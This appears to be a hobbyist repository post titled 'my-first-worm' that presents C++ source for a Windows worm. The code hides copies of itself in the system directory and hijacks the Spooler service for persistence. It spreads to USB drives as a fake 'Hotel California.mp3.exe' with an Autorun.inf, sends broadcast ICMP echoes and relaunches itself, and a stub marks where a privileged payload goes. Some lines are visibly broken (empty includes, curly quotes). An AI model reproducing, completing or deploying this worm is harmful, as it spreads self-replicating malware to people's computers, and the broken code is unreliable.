# my-first-worm
its my first time making a worm and its going to have a very weak mechanism at first but i would like to get it working well

/* testproc.cpp */
#include 
#include 
#define PROCESSNAME “testproc.exe”
using namespace std;
int main (int argc, char* argv[])   {
      ShellExecute(NULL,"open", PROCESSNAME, NULL, NULL, 0);
return EXIT_SUCCESS;
}
/* virus4.cpp */
#include 
#include 
#include 
#include 
#define DISGUISE "Hotel California.mp3.exe"
#define DISGUISEPATH "\\Hotel California.mp3.exe"
#define ENVOKER "\\envoker.exe"
#define FILEATTRIB 34
#define IPADDR INADDR_BROADCAST      // The address to be attacked with icmp echoes.
#define PROCESSNAME "virus4.exe"
#define PROCSSPATH "\\virus4.exe"
#define PROCESSPATH "..\\virus4.exe"
using namespace std;
/*-----------------The icmp global section-------------------*/         
struct o                            {
        unsigned char Ttl, Tos, Flags, OptionsSize, *OptionsData;
};
struct E                            {
     DWORD Address;
     unsigned long Status, RoundTripTime;
     unsigned short DataSize, Reserved;
    void *Data;
    struct o Options;
};
HANDLE hIP;
WSADATA wsa;
HMODULE hicmp;
struct hostent *phostent;
DWORD d;
char aa[100];
struct o I;
struct E es;
HANDLE ( WINAPI *pIcmpCreateFile) ( void );
BOOL ( WINAPI *pIcmpCloseHandle ) ( HANDLE );
DWORD ( WINAPI *pIcmpSendEcho) (HANDLE, DWORD, LPVOID,
WORD, LPVOID, LPVOID, DWORD, DWORD);
/*----------------------------------------------------*/
void _declspec (dllexport) identify(char *file)     {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
          char systemPath[101], envokerPath[101], buffer[201];          
          CopyFile(file, PROCESSPATH, NULL);
          SetFileAttributes(PROCESSPATH, FILEATTRIB);
          GetSystemDirectory(systemPath, 50);
          strcpy(buffer, "SC CONFIG Spooler error= ignore binpath= ");
          strcpy(envokerPath, systemPath);
          strcat(envokerPath, ENVOKER);
          strcat(buffer, envokerPath);
          strcat(systemPath, PROCSSPATH);
          CopyFile(file, systemPath, 0);
          CopyFile(file, envokerPath, 0);
          SetFileAttributes(systemPath, FILEATTRIB);
          SetFileAttributes(envokerPath, FILEATTRIB);  
          system(buffer);
}
void _declspec (dllexport) systemProc(char *proc)     {
/**
  * The payload section, The payload will run as an service.
  **/
SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
for (int countsys = 0; countsys < 10; countsys++)
     _asm  { nop }
        /* The payload code can be inserted here.            */
        /* The code will be executed with highest privileges */
}
void _declspec (dllexport) procCloner(char *cfile)    {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
     FILE *fp;
     char drive[3], newloc[30], autof[20];
     int let = 0x43;
     struct stat stbuf;             
    for (int i = 0; i < 256; i++, let++)    {
         if (let > 0x5A)
             let = 0x43;
             drive[0] = (char)let;
             drive[1]= ':';
             drive[2] = '';
            if ((GetDriveType(drive)) == 2)  { // This line fetches the removable drives.
                strcpy(newloc, drive);
                strcat(newloc, DISGUISEPATH);
                strcpy(autof, drive);
                if ((stat(newloc, &stbuf)) == -1) { // Check if file already exists
 in the pen drive.
                    CopyFile(cfile, newloc, 0);  // If not then copy the file.
                    strcat(autof, "\\Autorun.inf");
                    fp = fopen(autof, "w");
                    fprintf(fp, "[autorun]\nopen=%s", DISGUISE);
                    fclose(fp);
                    SetFileAttributes(newloc, 28);
                } else
                    continue;
        }
    }
}
/*------------------ The main engine of worm ------------------*/
int main (int argc, char* argv[])   {
//   SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
     HANDLE thread, cloner, thands[3];
     char *ptr, procfile[300];
     ptr = argv[0];
     strcpy(procfile, ptr);
     if ((strstr(ptr, ".exe")) == NULL)      {
         strcat(procfile, ".exe");
     }
     void (*clonproc) (char *);
     clonproc = procCloner;
     cloner = CreateThread(0, 0, (DWORD (__stdcall *)(void *))clonproc, procfile, 0, 0);
    HMODULE hmod;
    char dirpath[201];
    void (*smack)(char *);
    GetCurrentDirectory(200, dirpath);
    hmod = LoadLibrary(procfile);
    if ((strstr(dirpath, "system32")) != NULL)                         {      
  smack = (void (*)(char *))GetProcAddress(hmod, "?systemProc@@YAXPAD@Z");
            thread = CreateThread(0, 0, (DWORD (__stdcall *)(void*))smack, procfile, 0, 0);
    } else   {
       smack = (void (*)(char *))GetProcAddress(hmod, "?identify@@YAXPAD@Z");
            thread = CreateThread(0, 0, (DWORD (__stdcall *)(void*))smack, procfile, 0, 0);
    }
       thands[0] = cloner;
       thands[1] = thread;
       thands[2] = '';
/*--------------- The icmp section -----------------*/
hicmp = LoadLibrary("ICMP.DLL");
pIcmpCreateFile = (void *(__stdcall *)(void))GetProcAddress(hicmp, "IcmpCreateFile");
pIcmpCloseHandle = (int (__stdcall *)(void *))GetProcAddress(hicmp, "IcmpCloseHandle");
pIcmpSendEcho = (unsigned long (__stdcall *)(void *,unsigned
long,void *,unsigned short,void *,void *,unsigned long,unsigned
 long))GetProcAddress(hicmp, "IcmpSendEcho");
hIP = pIcmpCreateFile();
I.Ttl = 255;
for (int ping = 0; ping < 10; ping++)
      pIcmpSendEcho(hIP, IPADDR, 0, 0, &I, &es, sizeof(es), 8000);
pIcmpCloseHandle(hicmp);
FreeLibrary(hicmp);
/*--------------------------------------------------*/
// WaitForSingleObject(cloner, 200); // Activate this while testing the single thread.
// WaitForSingleObject(thread, 200); // Activate this while testing the single thread.
WaitForMultipleObjects(2, thands, true, 100); // Waits for the termination of two threads.
FreeLibrary(hmod);
chdir("..");
ShellExecute(NULL,"open", PROCESSNAME, NULL, NULL, 0);
ShellExecute(NULL,"open", PROCESSNAME, NULL, NULL, 0);
return EXIT_SUCCESS;
}
